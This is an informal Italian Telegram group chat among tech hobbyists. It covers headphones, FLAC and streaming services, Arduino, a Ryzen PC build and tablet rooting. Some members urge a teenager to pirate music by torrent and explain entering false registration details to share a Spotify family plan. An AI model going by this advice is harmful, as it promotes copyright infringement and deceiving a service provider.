When fai cose
Qualcuno sa dirmi come si aumenta lo spazio di archiviazione su virtualbox
Dopo aver installato il sistema operativo
cosa cazzo è???
praticamente dentro c'è liquido che non è olio minerale
Ehh che roba

Approfondimento di scienze stampato in 3d
Che cosa bella la stampante 3d 
Fico gran bel lavoro 
Grazie
X

Che bello telegram

Vero




Cuffie Marshall, Beats, sennheiser o sony (70/80€) – 29
 62%

Chromecast – 14
 30%

Cassa bluetooth (dai 20 ai 30/40€) – 4
 9%

 47 people voted so far.
io mi sono innamorato delle beats
tutto ma non le beats se vuoi qualita audio...
why?
hanno una pessima qualita audio
Sennheiser
io ho le hd201
io le ho provate e mi piacciono tantissimo
chissa con cosa le hai provate, e comunque non sono io a dirlo ma grafici delle varie risposte in frequenza
ti quali consigli?
budget?
più o meno come il suo
aivoglia se basta
Audio Technica ATH M30x  
AKG K240 MKII  
Audio Technica ATH M40x  
Shure SRH440
una di queste
hanno la cancellazione del rumore
o chiedo troppo?
no
pero sono molte isolanti
Passiva
Il noise cancelling attivo è una minchiata
Che selezioni pure te eh....
Non dire puttanate, dai marco
quoto assai
?
Se vai su cuffie di 300/400 lo senti
Ehm... Ti rovina la qualità della canzone
Le audio technica sono cuffie studio
E hai dimenticato cuffie buone su quella faccia
che dici? quei modelli sono sui 70-90
tipo?
Senti, io l'ho provato su Bose è funziona alla MERAVIGLIA
Con il noise cancelling non ascolti più la tua canzone, ma la canzone sommata all'inverso dell'onda del suono proveniente dall'esterno
eh sicuramente lo hai ascoltato con il telefono e un mp3?
Sennheiser 4.40
Marshall major 2
(Ci sarebbero anche le Beats ma eviti per non farmi linciare )
Nope, non si poteva con il telefono 
ah, io avevo provato le Bose e non le beats mi sa
Ma lo hai mai provato solo?
se queste le chiami buone...
gia un po meglio ma quelle che ti ho scritto io sono meglio
sì ed è anche fastidioso
perché tu non sei abituato a non sentire la tua voce e a non sentire il rumore intorno
sono pure bluetooth non possono avere una buona qualita propio per il bluetooth
a me serve la cancellazione del rumore perché ogni volta che mi sento la musica con le cuffie arriva mia madre a rompere
No
Sali allora
cioè?
Allora ti serve passiva
se lo trovo ti mando un grafico in cui mette in confronti beats da 300 euro contro akg da 70
Con quella attiva tua madre ti sente ancora di più
tipo queste?
prendi delle cuffie chiuse e sei a posto
si
io no  devo sentire mia madre e mia madre non deve sentire la mia musica
e no...
Cuffie chiuse -> cancellazione del rumore passiva -> più naturale e meno fastidiosa di quella attiva, come alzi il volume non sento più un cazzo fuori
cuffie chiuse
con passive cosa intendi?
ah ok
Grazie mille, sarei interessato, comunque ero a conoscenza della qualità akg, ma il design....
ook
In quel caso non vanno bene, perché se tua madre sta arrivando tu non la senti arrivare e ti sgama
giusto...
comunque le superlux per il prezzo hanno la stessa qualita delle akg fino ai 150 euro perche i driver sono di superlux venduti a akg
Che il padiglione riesce a coprire l'orecchio abbastanza da non riuscire a sentire l'esterno
vabbè, ma per la musica vanno bene
Ho un budget di 70€ oh, non ci allarghiamo 
quelle piacciono a me
eh ma non si chiamano passive
io ti ho fatto una lista
ecco
Audio Technica ATH M30x  
AKG K240 MKII  
Audio Technica ATH M40x  
Shure SRH440
Tu non immagini quante liste ho
le cuffie in cui il padiglione contiene interamente l'orecchio e quindi si appoggia sulla testa si chiamano circumaurali,over ear  o around ear
quelle in cui il padiglione della cuffia si appogia sul orecchio si chiamano on ear e isolano meno delle circumaurali
Ma quanto hai studiato prima di questa discussione? Chiudi Google, no su bara!
ma che google
Vabe ovvio
effettivamente le akg sono brutte da vedere
*vabbè
si ma se sono del livello di quelle 2 cuffie di prima piu le pessime beats sono inutili
prima le avevano chiamate passive
Nah, l'unico difetto che hanno è che sono ingombranti
Le akg sono non orribili....di più, inizio a sanguinare
poi le cuffie chiuse isolano molto meglio delle cuffie aperte o semi aperte
Ehm, sono cose base
ma le ath m30x isolano bene?
ma no
Ti piacciono seriamente?
si sono chiuse
Ma le cuffie aperte hanno un suono piu pulito e cristallino
si pero sono piu rumorose al esterno e isolano meno
non sono brutte
preferisco che la gente non mi rompa quando mi ascolto la musica
poi se prendevano in considerazione beats evidetemente non ascolteranno flac
Io ho un paio di akg e non sono brutte a vedere, solo ingombranti
Che ne dite delle blast ocelote della ozone... Sono da gaming e non so come vanno con la musica
ma i FLAC dove cavolo li posso trovare?
No, ok, queste sono brutte proprio
troppo retrò
Ecco 
Internet

Io non vedo l'ora di andarmene/scappare di casa per questo, mi mancano 2 anni e poi posso
pessime meglio le hyperx cloud e cloud ii
siti preciso non ne avete?
torrent e siti in internet oppure prendi i cd e li converti
ci stanno infatti
Di legali non ne frequento molti 
ok
appunto 
Scusa ma quanti anni hai?
16
Allora hai uno stile tutto tuo 
c'è anche scritto nella bio
io uso un programma che ha passato 
quello per spotify per caso?...
ma al massimo arriva a mp3
massima qualità
E ti pare che mi sforzo così tanto?! 
eh infatti
Beach
si
Abbonandoti a Tidal
È Spotify in FLAC
Io per ascoltare uso Spotify premium
io non ho soldi
Allora vai di torrent
Basta che non fai come un mio amico
.torrent.exe
1€ per tre mesi?
non è chissa che come qualita
Ahahahahahahahah
E l'ha aperto

Eh la madonna, la smetti di contraddirmi su ogni cosa?!
Diciamo che ha dovuto formattare il PC il giorno stesso
Preferisci Deezer?
è cosi...
E mi sembra il minimo
così poco costa?
Fallendo miseramente un suo amico che stava con noi su Discord è andato da lui a formattarglielo di persona
Promozioni
non ho detto che non va bene, anchio al telefono uso spotify premium al pc no con le superlux hd681 evo e amplificatore diy e sound blaster Z
Ragazzi....avete gusti di merda 
Se ti fai un account ogni 3 mesi sì
Altrimenti 2,5€ al mese
Cos?!
Oppure se sei pigro come me 10€ al mese
Non lo sapevi?
vabbè, o rimango a mp3 o uso torrent
Come?!
a 15€ al mese vi da 6 account
Dividi con 5 amici
2,5€ al mese
anche se mi noia scaricare un album per una canzone
Ahhh
Devi essere chiaro quando parli!
Basta che nella registrazione metti dati falsi, tranne quelli di chi paga ovviamente
Mi hai fatto sentire scemo
come faccio io
Perché devono risultare tutti e 6 residenti allo stesso indirizzo, ma si fotte easy il sistema
Non fanno controlli
fiiigoo
Poi ci sono io che non ho sbatti di farlo
E io non ho amici per farlo
E rip
woow
Vai su qualche gruppo Telegram pubblico a chiederlo
Qualcuno troverai
poi non ti pagano
E tu gli scolleghi l'account
Infatti
Essendo il capofamiglia puoi cambiargli password
No marco, preferisco qualcuno che conosco
I miei amici solo apk
Parlargliene, magari capiscono che stanno facendo una cosa illegale
E li convinci a far qualcosa di leggermente meno illegale
Ahahahahahahahahahahahahahahahhahaahhahaahahhahahahaahhaahahhahahaahhahahahagahahahahahahahahahahahahahah
i miei usano YouTube
*leggermente*
La stronzata più grande mai sentita
I tuoi amici ragionano come i miei amici?
Si
Fai conto che un mio amico ha detto
i miei amici si ascoltano Gucci gang, la qualità audio non serve a nulla
"Spotify dovrebbe essere gratuito perché la musica la puoi scaricare gratis"
best genio eva
Chi cazzo li paga gli artisti?
tipo windows
Non a questi livelli i miei amici però 
E da quando si può scaricare musica gratis?
Parli di YouTube? YouTube infatti ha la pubblicità, che paga gli artisti
i vinili dovevi pagarli
Che poi questo ora lo considero pure amico
Ma due anni fa mi ha preso a calci il telefono
Poi su YouTube la qualità è bassa
Però boh abbiamo iniziato a giocare insieme su Fortnite
Lo so
un mio amico per incoraggiarmi a fare una cosa mi ha buttato il telefono nell'erba
bagnata
Ma su altri servizi non è così alta
Spotify usa il codec VORBIS (conosciuto come .ogg) a 320kbps (160 per gli account Free) che non è male, però è comunque compresso a un CBR (bitrate costante) di 360Kbps
Tidal, che però costa 20€ al mese ti streamma in qualità CD
che è meglio?
Quindi VBR (bitrate variabile), 16 bit, samplato a 44100Hz
Eh beh
E se vi chiedete cosa significhi sto numeraccio, vi mando a un messaggio che ho scritto qualche settimana fa
This
devo provarlo tidal
Su cel, per non girare con flac ingombranti, ho convertito tutto in ogg vbr 500kbps 16 bit 48kHz
Non male
Se il tuo cellulare supporta i 24 bit
E il FLAC originale era a 24 bit
Ti consiglio di tenere 24 bit
Hai un errore di quantizzazione minore
Ergo cogli più sfumature nel suono

(Madò mi sono appena accorto che per scrivere una cosa ci ho messo 6 messaggi)
I file originali sono flac con 1200 o piu kbps, alcuni album a 16, altri a 24bit
se scarico un album da torrent
come mi accorgo se è FLAC?
Non penso, è un cel di 5 anni fa
Dal peso e dall'estensione dei files
Cerca sulle schede tecniche di gsmarena
solitamente da dove scarichi tu?
Di solito c'è scritto anche che DAC ha
Analizzatore di spettro 
E sei sicuro che non ti sta truffando ed è un MP3 pompato in un FLAC
O usare l'orecchio
Sai che alla fine non te ne accorgi troppissimo
Cioè, io alla fine con la qualità Spotify mi trovo bene
appunto
24bit 192kHz riporta gsmarena
ora provo a mandarti una canzone scaricata con il programma che le scarica da Spotify e poi mi dici cosa ne pensi
E allora con un buon player (quello stock del tuo telefono al 99% fa cagare) ti senti pure i file a 24 bit
Poi se vuoi qualcosa di veramente buono, comprati un DAC USB e attaccalo alla porta OTG del telefono
Quello di default noni sembra male, altrimenti a volte uso vlc
Avevo intenzione di investire un po' di soldi per un player della fiio di quelli che fanno anche da dac usb, ma a quel punto non userei piu il cel (e ora i soldi non li ho)
Un tizio una volta mi aveva consigliato poweramp
vabbè raga, io vado
notte a tutti
Lo hanno consigliato anche a me, costa 4€ sullo store
Notte
oddio Groupon
Ci ho perso mesi a disiscrivere mia madre dalla loro newsletter
Perché gli continuavano ad arrivare
Non lo vedevo  da un botto
Addirittura
.
Per avere delle casse con una qualità superiore a delle cuffie da 80€ ci devi spendere minimo 1000€ (perché nel mondo dell'hi-fi sono molti di più i parametri da tenere in considerazione), quindi cuffie
Cassa aukey da 20?
E la paragoni a delle cuffie da 80? Ma va
Non sto paragonando la qualità audio di una cassa da 20 a quella di cuffie da 80 
Cioè, le mie Sennheiser suonano meglio del mio impianto che non costa poco... E questo perché l'impianto al momento non è montato bene, ma non ho né tempo né voglia di sistemarlo (mi hanno regalato le casse, ma costerebbe sui 3/4000€), con le cuffie spendi 100€ e stai apposto
Sono indeciso su cosa comprare, non voglio la morale sulla qualità del suono oh 
Allora... Che chiedi se comprare delle cuffie da 80 o uno speakerino da 20
Sei pratico in quinta
Perché sono indeciso su cosa comprare per primi visto gente ho appena comprato le cuffiette Xiaomi
Che sia chiaro, anche io ho uno speakerino niente male da 30€ che uso quando facciamo i party dagli amici che non hanno le casse, però se devi ascoltarci la musica everyday non te lo consiglio mai
Che?
HO TROVATO UN'APP FANTASTICA
E poi arrivano questi a rovinare tutto
Lo speaker lo userei solo quando sono solo in casa o con amici
Vabbuò comunque aggio votato
Bravo piccino
Piccino non è molto napoletano
Dovevi usare guaglione
Ahhh
Riprovo
Brav guaglione
Doman na bella Margherita
A meno che non vuoi che te lo dica in romanesco
Non lo conosco..... neanche io napoletano
Eh ho notato
Oh so pugliese
Io conosco bene il romanesco (ho perso una serata a studiarmi la grammatica del dialetto su un sito internet) e poco il napoletano, perché visto che ho origini nel basso Lazio lo sento parlare più che altro
Te sei strano....
Perché?
Se voglio parlare una lingua prima la studio
ma scherzi? Spotify arriva al Flac
ma c'è lo sconto studenti, fallo no? 
il programma dico io
quello tuo
eh sisi, dalle impostazioni puoi anche scegliere il flac
poi se hai spotify free è inutile, perchè la qualità e lockata da spotify
Spotify usa ogg, che nel migliore dei casi arriva a 500kbps
ah se? 🤨
5€....sempre se come me non hai bloccato la carta perché ti dice che le credenziali digitate sono errate eh
Ma non sarà mai FLAC
Non penso che Spotify abbia i FLAC nei suoi server
Cos 'è un flac
file audio in qualità altissima, lossless
File audio non compresso
Mp4 è compreso?
Così com'è stato registrato senza la minima perdita
Ah fico
Direi proprio di sì
È compreso in MPEG
Che comprime manco poco
Formati non compressi quali sono ?
.
Video?
Sai vero quanto può pesare un video non compresso?
Flac, Avi, png
Diversi GB al secondo
Audio
.avi può essere anche compresso
FLAC, e WAV ma è limitato alla qualità di un CD (16 bit 44100Hz)
un video 1080p, 30fps, pesa 7.2 MB al frame
ha anche senso, é come una foto
 


Fine giugno però ☹️
triste 
magari arriva per il mio compeanno 
Beato te 
Cosa ha di speciale questo FPGA per essere specifico x IoT ?
Perché la mano dei referral non shorta più? 🤔
Da unieuro
what 
fiiigo nero però
Perché non è un link di Amazon o altri
Non shorta tutto
Come no?
sarà di canapa
Guarda recent actions
Aaaaah
Boh bug
Adesso vado a ritirare un redmi 5 plus, poi se riesco controllo
Google Accidentally Reveals Expensive, Radical Pixel 3


O ci stanno trollando tutti o i pixel 3 saranno i telefoni più belli del 2018
Secondo me non trollano 🤔
Anche secondo me
Minchia che figata sarebbero dei telefoni così
Vivo Apex
Ma funziona da culo
L'altro candidato è il Lenovo Z5
E non è impossibile che sia lo stesso telefono insomma... Che Google affidi i pixel a Lenovo (oppure li faccia in HTC nella divisione che ha comprato)
perfetto e ora che ho compilato tutto nel migliore delle mie esigenze vado a cannibalizzare un fisso degli anni '90 perchè mi serve l'hdd
⚠️ NORME EUROPEE DRONI 2018 ⚠️

Come l'anno scorso vi avevo preannunciato in un video durante questa primavera 2018 l'Unione Europea è nella fase finale della redazione del 
 (che 
 quello attuale italiano dell'
 che è lacunoso e non chiaro).

La commissione incaricata ha quindi creato questo 
 e quali potrebbero essere le esigenze principali. Se vi interessa vi lascio il link per compilarlo



Ma il rasp me lo regge un server ts?
Teoricamente si, che modello?
No, ts3 non ha un porting in ARM
3
Ok
Giusto
Eh no potrebbe esserci qualcosa open source che gira su ARM
Per ts3 no, avevano fatto teaspeak (scritto apposta cosi') ma non funziona ancora su arm
Qualcuno sa dirmi una colla che resiste all'acetone??
Una bicomponente?
La pattex, per lo meno da scheda tecnica, una volta asciutta la rimuovi solo meccanicamente
Let me 
 that for you:
 

Perché se attacco un sensore a arduino si spegne? 
Se lo colleghi male si...
perchè hai invertito 5v e ground probabilmente
Ma è scritto così nel sensore 
Manda una foto
Ah ora fa 
Non è vero
AH HO ATTACCATO MALE LA BREADBOARD
O come si scrive
it's giusto
nel senso che si scrive così
sbagliaton't
Qualcuno mi saprebbe aiutare con un oscilloscopio portatile? Fino a poco tempo fa funzionava, ma ora la scheda analogica mi da problemi
Quando la collego la "linea" sale sopra
Quando è scollegato sta centrale, come dovrebbe
Mentre così è con la scheda analogica
Questo è "adatto" come sensore per chi passa alla porta o è meglio quello nella foto che vi sto per mandare?
Questo
Uhm non è proprio appropriato per quello scopo
Io utilizzerei una fotocellula (dovrebbe essere nel kit di sensori) con un laser puntato sopra
Se poi lo vuoi fare strafigo aggiungici anche degli specchietti per fare rimbalzare il fascio laser e creare una barriera sensibile
Qualcuno ha seguito l’evento OnePlus?
Se prendo OnePlus 6 dal sito ufficiale mi arrivano anche le cuffie?
Nope, le cuffie sono 70€ extda
Però se lo prendi dal sito originale hai lo sconto studenti (tipo 50€) e 20€ di accessori gratis usando il link che trovi su 

Gli angoli a 45° come vanno fatti?
Assonometria planometrica
Cosa hai comprato
Cosa si sono fumati questi? Siccome ho scritto "overVolt" sul campanello... 
Gli angoli come si fanno?
Devo disegnarlo a mano
Ho la fotocellula, ma non ho il laser
Droga troppo pesante cazzo, la voglio
povero Postino 
Roba bella da recensirvi, ma ne è arrivato ⅓
Che poi nell'indirizzo alla prima riga ho scritto "name: marco romboli"
Up
Assistant e cosi divertente
Giiunti sul campanello il logo di Overvolt
*aggiungi
Per non floodare non mando il resto
Stasera si sta leggeri
Leggerissimi!
Beh potresti mettere
ci fai piadine?
'mazza se è lungo sto messaggio
Io li ho sempre ottenuti facendo il resto
Fai tutto il resto e poi colleghi gli angoli
Ora ci provo
E le due linee verticali?
Quanto misurano?
c'è scritto di lato
4 mm
Parlo Delle altre
Quando vai a fare le linee inclinate a 45° ti viene l'intersezione con la perpendicolare alla linea di 4mm
Comunque ho il tuo stesso libro, che scuola fai?
Itis
Da quest'anno diventato ITT purtroppo
Stessa cosa a me, a Viterbo
Se metto la squadra a 45 esce storto
Io sono di itri
Puoi mandare una foto?
Di cosa?
Di come ti esce se metti la squadra a 45°
Questa è un'assonometria.. Non una proiezione ortogonale, prima fai il piano orizzontale e poi misura
In che senso prima il piano orizzontale?
Prima mi son fatto la base
E poi ho alzato
Ma esce storto ai lati
Hai fatto prima la proiezione ortogonale?
Qui esce storto
Certo
Alle medie
Allora dovresti avere le misure, sulla sinistra c'è una sovrapposizione che non si dovrebbe vedere
Sì, infatti ho sbagliato qualche millimetro
Pero non ho capito come fare queste linee
scusate ma esistono keycup personalizzati per le tastiere a membrana?
Ma cos'è sembra il "timbro" per vedere se i piani sono perfettamente livellati o se hanno dei punti piú alti/bassi
Kinda
Spianate, sono più alte e più morbide... È un incrocio tra la pasta della piadina e di una pizza non bassa da pizzeria
Sono quelle che avevamo mangiato insieme a Tuttinfiera a Padova?
Yup
Erano bone sì allora
Cottura su pietra poi 
Miii
Vabbè buono quasi quanto il polpettone di mamma
Xiaomi?
miPietra
AHAHAAHAHAHAHAHA
MiRock
MiStone
miSpianata
MiSachenonsaicucinare
Io o marco?
Ma qualcuno ha mai comprato qualcosa da thepihut?
Nope
Non so quali siano i tempi di spedizione
Entrambi dai ahaha
Su marco  concordo 
Aia 
 tu hai mai comprato da thepihut?
Yup, lo zero W
Quanto tempo ci ha messo ad arrivare?
Focaccia con mozzarella e cotto?
Spianata 
In realtà quel salame è arancione da quanto è piccante, altro che cotto 
Ha anche la faccia migliore di quella della fiera
Mi rispondi sopra?
Miiinghie
Esci la ricetta ora
wow, mi fai tornare fame, viva il piccante
Spianataaaaa
 sono 10 minuti che guardo la tua storia e rido ininterrottamente 
Ma perché
Non c'è niente da ridere sul fatto che mi sono accecato con il nuovo impianto a LED che finalmente non prende fuoco dopo 5 minuti come è successo altre due volte
Rido TROPPO
Ahahahahahahah
Ti salvo
Da quando ha accettato la richiesta sto guardando quella storia.
E soprattutto che per non avere cadute di tensione devo usare sto qua per quanto consuma
Poi mi chiedete perché di sto coso
Eh la madonna ahahahahah
Ti ho detto 
È una droga
Citazione in inglese si dice quote?
Yup
E come si pronuncia?
Mo un giorno di questi, se avrò voglia ci saldo un DHT11, così do un utilità a quel fregno che sta da novembre nel cassetto insieme agli altri sensori di Arduino
Dimmi la frase
"eh la madonna, dire che basta"
direi*
Ho omesso erroneamente una lettera
"kuot"
 lo salvi per me ❤️
LoL sto audio
Per tre persone:

200 di 0
250 di manitoba
125 di strutto
una bustina di lievito
7-8 cucchiai di olio
sale
acqua

ventricina (o spianata) e scamorza dentro
No
Grazie
Registri lo schermo se proprio ci tieni
Daiii mi FAI morire 
Altro che il blog di giallo zafferano
Tanto ora Insta non manda più la notifica su screenshot e registrazioni
 lo fai tu?
Vai a vedere la storia di Marco
Cosa?
Salvare al storia
Ovvio, ora la mando qui :)
Siiii
 sei diventato il mio mito 
MA PERCHÉ
Mi fa morire ahahahahah
Cosa c'è da ridere Dio *wait, qua siamo family friendly su sto gruppo* bellissimo e stupendamente fantastico
Dai che scriviamo solo noi
eccolo, impresso nella storia
:)
Sto morendo ahahahahah

Ora lo aggiungo alla lista di canzoni rilassanti del google home
Sei finito
Subito!
Ahahah ahahah
Sto crepando dal ridere
Mia mamma;:
Perchè ridi?
Io:
Ah boh

Fissa quel video
Hai visto?
Ti prego

ma io non capisco
Se lo fai ti amo
Graazie
cosa c'è da ridere? 🤨
Tu fissalo, poi vedi quanta gente ride
non posso neanche fissare messaggi
è che sto tentando di fare musica flop con la anet, altrimenti sarei qui a parlare ora, giusto per evitarmi di studiare Storia Dell'Arte
 fissa questo video
ma anche se potessi, perchè fissare un video 
Grazie
PERCHÈ
MA
ma basta taggarlo per robe inutili
cosa cosa cos cosa?
musica? 
hehehe
Non ti è piaciuto?

.ok non son simpatico
Hahahahahaha
eeesaaaatto
Ma l'ha tolta poi
Adesso ti picchia
Uno che capisce!
ah, ci ho capito giusto allora 

Tu fissa, grazie
Si è offeso
 watch this
 vedi, anche Marco ride
Mmh cosa dovrei capire actually? 🤔
E quindi?
No perché non la trovavo
eh e allora? non capisco cosa faccia ridere in quella storia
io la vedo in realtà
Ti prego, se la fissi vengo davanti a casa tua e mi inchino
Condivido anche se non l’ho capita
è la meme dell' 

Boh la reazione esagerata alla luce, ma non vorrei ci fosse qualche doppiosenso o citazione nascosto 🤔
Posso mandare una specie di porno che spiega la situazione dei social oggi?
Elimino subito
yopen't mi ha steso però
arcyes a sto punto
Sera
Ciao 
ciaoo
No, fissala tranquillo
arcnon't
Ma stai usando cura come software?
arcnopn't e ho appena raggiunto il limite assoluto, basta
obv
Cose?
*obviously
Meglio non aver visto
Hahahah gli unici canali che al bot vanno a genio sono programmerJokes, overVolt e breaking news, mi sembra
È l’ultima che non ho capito lol
🤔
E quello per le offerte
Ci devo dare un occhiata
.
vuol dire "ovviamente" in inglese zii
stile tan^-1 o arctan invece che tan, che è l'inverso
anche i coupon di corrado, programme humor e offervolt
Ma sul serio gente non sono abituato al Kindle Fire fluido, fa impressione 
 eri tu che lo avevi?
pk?
cosa è successo?
aggiornamenti?
È cambiato così tanto?
Si
prima fammelo caricare che da talmente tanto tempo che nn lo uso che forse è esploso
L'ultimo di Amazon
fire 7?
Andava dimmerda da sempre... Zero multitasking, lag anche su telegram..... Adesso funziona come un tablet onesto 
7  2017
Io lo voglio prendere
Ma seguirò il tuo consiglio
Boh secondo me 7 pollici è piccino
Se non scende di prezzo sentirai scendere santi ☺️
L'8 2017 l'hanno rootato, è solo questione di tempo che anche il piccolo ceda 
ok, ora aggiorno
Ho avuto un 8 pollici e non mi entusiasmava troppo
grazie
Dovessi prendere un tablet punterei a un 10 pollici
Eh l'anno scorso l'hanno dimezzato...
È un telefonone... Comodo per Netflix, Telegram quando sei a casa, calendario e poco altro
Rotto?
Nope, fagocitato dalla sorella
Meh con quel tanto uso il telefono... La vera utilità sta nel 10 pollici
Hahaha
Ci sono 10" con octacore e dual-OS a 80-90€ su gearbest
Yup, sto valutando di prenderne uno per la sessione
che versione hai?
di fireos
Scusatemi...
Apprezzate sta cazzo di foto che per farla ho preso il retro della freccia dell'arco
Iniziano a scendere i santi
Vorrebbe aggiornarsi ancora però
Fallo aggiornare povero
E due aggiornamenti ravvicinati significano che il primo è buggato e vulnerabile, quindi lo tengo fermo in attesa dell'exploit per rootare
Marco nn va bene è troppo veloce
Troppo
Troppo veloce
1% hahahaha
Rip
o zio
non lo carico da 4 mesi
vacci piano
è gia tanto se si è riacceso 
Ecco quella è una cosa in cui non ha mai deluso
Anche una settimana e mezza di batteria lasciandolo acceso nello zaino
non è manco gonfio
idem, era nello zaino da quando sono tornato dalle vacanze di natale
l'ho usato una volta in 5 mesi
Momento spam
Tutti quelli che si trovano a Trento e dintorni accorrano Gioveedì alle 15 al Dipartimento di Fisica!
Cos'è sta roba?
Roba buona
È una figata
Ma perchè
perchè non abito a Trento
perchè 
Almeno tu con la macchina ci arrivi
io ho un kindle paperwhite che in standby (non spento) è durato quasi 2 mesi  (ovviamente è fatto appositamente per consumare poco a discapito delle prestazioni)
Finalmente non sbaglierò più Lorenzo 
Si ma il Fire è un tablet, non un eReader
ci sei tu ciccaaaa
Mi consigliate un programma tipo fl studio ma gratuito
SIIIIII
noooo! ho lezione fino alle 15:30!
CRISPR CAS9 
lo so
Soooo sad
prima volta che la mia faccia finisce su un social qualsiasi (si, su fb non ho mai messo una mia foto in 5 anni...)
Ahaha
quasi quasi salto analisi2, tanto non la do a giugno...
o salto solo l'ultima mezz'ora così da esserci giusto per l'inizio
Ecco ecco

Raga su win10 come faccio a runnare una distro live
Ce la seleziono sul Eufi ma non parte
Virtualbox/VMWare/Qemu/kvm
Mi serve non su virtual machine
Ah, allora basta che selezioni la chiavetta/disco con la live
Dal boot menu
Non va
A me no che non va bene la distro che ho
Tra amd64 e i86(una cosa del genere) su un sistema a 64 bit quale avrei dovuto scegliere?
amd64
Allora non è quella
Che programma hai usato per mettere la iso su chiavetta?
Yumi
Devo usare gparted
Prova con Rufus
Dici che cambia?
Bah provo
Funzia
comunque giovedì sera c'è pure speck&tech e sono riuscito anche questa volta ad organizzarmi per venire
Buono! Io dovrei esserci, passaggio di marco permettendo
io sono costretto a cercare passaggi, a piedi impiegherei piu di 1h per tornare a casa (non ci sono mezzi pubblici...)...
Manca la batteria
Se proprio voleva fare il fenomeno però almeno sapere come funziona un ventilatore
Yes
Ti conviene creare già la traccia finale con audition
É un insieme di computer, in genere
Ma che è la barra di Google di Android 1?
Si 

Quanto figo sarebbe un tema Froyo? 
"Il momento è per sempre" e io ho appena fatto le roto-traslazioni, mi ha stesissimo
Qualcuno per caso ha la meme del "For, While, Do While explained with tomatoes and eggs"?
quella che avevano mandato ere geologiche fa su ProgrammerJokes
Ma é considerabile supercomputer?
Come?
Chi può remixare la voce di questo giovane ragazzo che esclama " e la madonna" sulla canzone di l'amour toujurs?
 é un compito degno di te
che io sono a scuola 
Eh, anch'io
Idem
Hey come osi ripubblicare la storia? Mmmmm
Io no
Nope
Destro, dovrebbe esserci edita con audition
Un laser qualsiasi va bene (anche uno cinese da 2 soldi). Il laser non va collegato ad Arduino. Solo la fotocellula
Raga devo creare una rete LAN su win10, come fo?
Per farci cosa?
ragazzi posso chiedere in questo gruppo per un consiglio su una build di un pc o vado offtopic?
Non credo proprio, chiedi pure
pensavo ad una configurazione da ufficio ma un po' scattante, e leggendo qua e là ho sentito ottimi pareri sulle ryzen
cpu:  AMD Ryzen 3 YD1200BBAEBOX 
mobo:  MSI A320M PRO-VHL AMD A320 Socket AM4 microATX
 
 lo farete?
oppure questa cpu: AMD Ryzen 5 1600
qulacuno di voi conosce questi componenti o li ha provati?
🤔 che tipo di uso ufficio? classico mail-office-excel-outlook-browser e software di contabilità, oppure grafica con scheda video dedicata?
classico
infatti pensavo di evitare proprio la scheda video
allora puoi benissimo optare per una APU Ryzen, la 2400 è ottima e parecchio scattante
ed essendo stesso socket, dovrebbe andare bene la mobo che ho scelto giusto? 

Altre domande 
RAM: Corsair Vengeance LPX 8 GB (1 X 8 GB), DDR4, 2400 MHz, C14 XMP 2.0, Nero
dovrebbero andare bene?
SSD: samsung evo 850, che ne pensate?
PSU: 350w basteranno?
le ram non vanno bene, Ryzen vuole ram ad alta frequenza..devi prendere le Vengeance da 3000
il Samsung 850 è ottimo, vai tranquillo..altrimenti se vuoi risparmiare qualcosina vai sul Crucial, ottima qualità anche quello
MSI A320M PRO-VHL AMD A320 Socket AM4 microATX motherboard
la scheda madre non la prende, non mi fa aprire il link
si le Vengeance sono compatibili, ma io non prenderei mai una MSI per Ryzen, hanno problemi di bios..come microATX ti consiglio vivamente questa: Asrock AB350M Pro4
prezzo simile ma componenti migliori e 0 problemi bios
Aaaah ti ringrazio 
con tutte le mobo per Ryzen devi aggiornare il bios vedi, per farle funzionare con le APU nuove..devi contattare AMD e ti mandano un Athlon compatibile con quel socket per poter aggiornare
gratis ovviamente
ah... ma poi devo rimandarglielo indietro?
discorso alimentatore: quale volevi prendere? e quanto puoi spendere?
sarei andato su un corsair, perché la marca mi ispirava fiducia, ma non ho reali indicazioni
comunque non avendo una scheda video, immagino che rimanendo sui 350W dovrei riuscire a non aver problemi
si, devi contattare il supporto AMD e te lo spediscono, e poi rimandarglielo..ma non penso che facciano storie se non glielo rimandi..qui trovi tutto 
   
no tranquillo, basta e avanza un 350W..basta che non prendi un Corsair VS, sono pessimi
ti mando io una lista di alimentatori ottimi
Sapete dare 2 e 3?
prendi uno tra questi, sono ottimi alimentatori 1) be quiet! BN261  
  2) Seasonic SS-350ET-F3 
  3) Seasonic SSP- 350 ST  
  4) FSP HEXA 
se avanzo tempo why not 
 come faccio ad installare una app che non c’è sull App Store del fire? Se lo rootto mi installa il google play?
Spotto 
 in A2S10
Tipo TelegrAm
yep, A204, e tu sei in prima fila
perfetto grazie mille, ultime domande, per la mobo che mi hai indicato (su amazon: ASrock 90-MXB510-A0UAYZ Scheda Madre, AMD B350, Nero
) c'è scritto Supporta DDR4 2666
immagino che quindi non siano compatibili le ram 3000? o mi sfugge qualcosa?
In che periodicità se non è specificato?
Ehb
Ormai finito ci prendo due se va bene
Ci ha messo pure angoli non notevoli
Dio..
penso vadano risolti indicando con 
 la periodicità dell'equazione
Lol ti avevo fatto il 2
Dovevi solo usare prostaferesi e fare due conti
Cazzo
E ma mi risultavano cose enormi
Ma no
Vabbè ormai è andato
Grazie lo stesso però
Ho trovato questa mobo: Asus STRIX B350-F GAMING Scheda Madre, Nero
deve essere una variante di quella che mi hai consigliato
Puoi installarlo senza root
L'hai usato per mesi senza playstore?
si, sono compatibili..Velocità di memoria supportate: 2133,2400,2933,3200 MHz
Come?
🤔
Te l'ha scritto prima 
Non avevo visto il messaggio con il link

Avevo risposto con lo swipe a destra
Raga sapete che hanno strikato pew die pie?
Se? 
?
Per cosa?
Nel suo stream ha detto stupid twitch girls e una ragazza famosa su twitch lo ha reportato in live,poi pew die pie ha spiegato tutto a quelli che hanno strikato e hanno tolto il strike ed ora quella ragazza ha perso iscritti
ora mi è arrivata la mail dell'evento con la locandina in allegato 
 ma sbaglio o il fire è piu veloce di oneplus 6? hhaahahahah
Ecco

system (pause) o system ("pause") qual'è la differenza? C++
Pause
Ok, fatto così, ma il compilatore mi da errore, se metto le virgolette no🤦‍♂
Eh perché accetta un argomento come stringa
Su alcuni compilatori pause è una costante
syetem(pause) non ha senso, almeno che pause non sia dichiarata
Ok
Ah se? Allora ha senso
Grazie a tutto
Tutto
‍♂
Puoi modificare i messaggi, premi sopra
Che poi
Si
Vado do fretta

Grazie
e scrivi meno messaggi,
non
spammare
così


Nel testo sul quale sto studiando sono tutte errate
Ma come software posso usare per fare una stampante 3d con una shild  CNC per il  controllo dei motori passo-passo
?
ELLA MADONNA 
è tornato al suo prezzo normale
anzi, è pure scontato a 83€
